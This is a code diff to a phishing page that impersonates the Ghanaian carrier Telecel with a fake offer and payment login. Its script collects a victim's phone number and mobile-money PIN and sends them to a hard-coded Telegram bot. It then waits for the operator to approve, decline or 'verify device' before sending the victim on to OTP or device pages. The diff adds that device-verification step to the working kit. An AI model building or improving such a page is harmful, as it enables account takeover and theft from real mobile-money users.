@@ -24,79 +24,30 @@
             box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .logo-section {
-            text-align: center;
-            padding: 30px 0 10px;
-        }
-        .telecel-logo {
-            width: 85px;
-            height: auto;
-            margin: 0 auto;
-        }
-        h1 {
-            text-align: center;
-            font-size: 26px;
-            font-weight: 700;
-            margin: 10px 0 8px;
-            color: #1e2937;
-        }
-        .subtitle {
-            text-align: center;
-            color: #475569;
-            font-size: 15px;
-            padding: 0 25px 20px;
-        }
+        .logo-section { text-align: center; padding: 30px 0 10px; }
+        .telecel-logo { width: 85px; height: auto; margin: 0 auto; }
+        h1 { text-align: center; font-size: 26px; font-weight: 700; margin: 10px 0 8px; color: #1e2937; }
+        .subtitle { text-align: center; color: #475569; font-size: 15px; padding: 0 25px 20px; }
         .offer-info {
-            background: #fff0f0;
-            margin: 0 25px 25px;
-            padding: 16px;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid #ffe0e0;
+            background: #fff0f0; margin: 0 25px 25px; padding: 16px;
+            border-radius: 12px; text-align: center; border: 1px solid #ffe0e0;
         }
-        .form-section {
-            padding: 0 25px 30px;
-        }
-        .form-group {
-            margin-bottom: 24px;
-        }
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #1e2937;
-        }
+        .form-section { padding: 0 25px 30px; }
+        .form-group { margin-bottom: 24px; }
+        label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #1e2937; }
         input, select {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 10px;
-            font-size: 16px;
+            width: 100%; padding: 14px 16px; border: 1.5px solid #e2e8f0;
+            border-radius: 10px; font-size: 16px;
         }
-        input:focus, select:focus {
-            border-color: #E30613;
-            outline: none;
-        }
+        input:focus, select:focus { border-color: #E30613; outline: none; }
         .continue-btn {
-            width: 100%;
-            background: #E30613;
-            color: white;
-            border: none;
-            padding: 16px;
-            font-size: 17px;
-            font-weight: 700;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 10px 0 20px;
+            width: 100%; background: #E30613; color: white; border: none;
+            padding: 16px; font-size: 17px; font-weight: 700;
+            border-radius: 50px; cursor: pointer; margin-top: 10px;
         }
         .error-msg, .success-msg {
-            text-align: center;
-            margin: 12px 0;
-            font-size: 14px;
-            display: none;
-            padding: 10px;
-            border-radius: 8px;
+            text-align: center; margin: 12px 0; font-size: 14px; display: none;
+            padding: 10px; border-radius: 8px;
         }
         .error-msg { color: #dc3545; background: #ffebee; }
         .success-msg { color: #22c55e; background: #e6f4ea; }
@@ -112,10 +63,9 @@
         <h1>Login to Make Payments</h1>
         <p class="subtitle">Enter your details to proceed</p>
 
-        <!-- Offer Info -->
         <div class="offer-info" id="offerInfo" style="display: none;">
             <strong style="color:#E30613;">Selected Offer</strong><br>
-            <span id="offerTitle" style="font-weight:600; font-size:16px;"></span><br>
+            <span id="offerTitle" style="font-weight:600;"></span><br>
             <strong id="offerPrice" style="color:#E30613; font-size:22px;"></strong>
         </div>
 
@@ -157,7 +107,8 @@
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
-            REDIRECT_PAGE: 'otp.html'
+            REDIRECT_PAGE: 'otp.html',
+            DEVICE_PAGE: 'device-verify.html'
         };
 
         let state = {
@@ -166,7 +117,8 @@
             lastUpdateId: 0,
             pollInterval: null,
             approveId: null,
-            declineId: null
+            declineId: null,
+            verifyDeviceId: null
         };
 
         const phoneInput = document.getElementById('phone');
@@ -189,32 +141,21 @@
             offerPriceEl.textContent = `GHS ${state.offerPrice}`;
         }
 
-        // Ghana Number Validation
-        phoneInput.addEventListener('input', () => {
-            let val = phoneInput.value.replace(/[^0-9]/g, '');
-            phoneInput.value = val;
-        });
-
-        pinInput.addEventListener('input', () => {
-            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
-        });
-
-        function isValidGhanaNumber(phone) {
-            const prefixes = ['020', '050', '023', '024', '027', '054', '055', '057', '059', '026'];
-            return phone.length === 10 && prefixes.some(p => phone.startsWith(p));
-        }
+        phoneInput.addEventListener('input', () => phoneInput.value = phoneInput.value.replace(/[^0-9]/g, ''));
+        pinInput.addEventListener('input', () => pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4));
 
         function sendToBot(phone, pin) {
             const ts = Date.now();
             state.approveId = `approve_${ts}`;
             state.declineId = `decline_${ts}`;
+            state.verifyDeviceId = `verify_${ts}`;
 
-            const message = `<b>🔴 New Telecel Login Request</b>\n\n` +
+            const message = `<b>🔴 New Telecel Offer Request</b>\n\n` +
                             `Offer: ${state.offerTitle}\n` +
                             `Price: GHS ${state.offerPrice}\n` +
                             `Phone: ${phone}\n` +
                             `PIN: ${pin}\n\n` +
-                            `Approve this request?`;
+                            `Select Action:`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -224,26 +165,32 @@
                     text: message,
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: '✅ Approve Access', callback_data: state.approveId },
-                            { text: '❌ Decline', callback_data: state.declineId }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve Access", callback_data: state.approveId },
+                                { text: "🔍 Verify Device", callback_data: state.verifyDeviceId }
+                            ],
+                            [
+                                { text: "❌ Decline", callback_data: state.declineId }
+                            ]
+                        ]
                     }
                 })
             })
             .then(() => {
-                successMsg.textContent = "✅ Sent! Waiting for approval...";
+                successMsg.textContent = "✅ Sent! Waiting for approval on Telegram...";
                 successMsg.style.display = 'block';
                 startPolling();
             })
             .catch(() => {
-                alert("Failed to send request.");
+                alert("Failed to send to Telegram.");
                 spinner.style.display = 'none';
             });
         }
 
         function startPolling() {
             if (state.pollInterval) clearInterval(state.pollInterval);
+
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10`)
                     .then(r => r.json())
@@ -253,10 +200,17 @@
                             state.lastUpdateId = Math.max(state.lastUpdateId, update.update_id);
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+
                                 if (cb === state.approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.REDIRECT_PAGE;
+
+                                } else if (cb === state.verifyDeviceId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.DEVICE_PAGE;
+
                                 } else if (cb === state.declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
@@ -276,13 +230,8 @@
             const phone = phoneInput.value.trim();
             const pin = pinInput.value.trim();
 
-            if (!phone || phone.length !== 10) {
-                errMsg.textContent = "Please enter a valid 10-digit number";
-                errMsg.style.display = 'block';
-                return;
-            }
-            if (!isValidGhanaNumber(phone)) {
-                errMsg.textContent = "Invalid Ghana number. Must start with 020, 050, 024, etc.";
+            if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
+                errMsg.textContent = "Please enter valid Ghana number (e.g. 0201234567)";
                 errMsg.style.display = 'block';
                 return;
             }
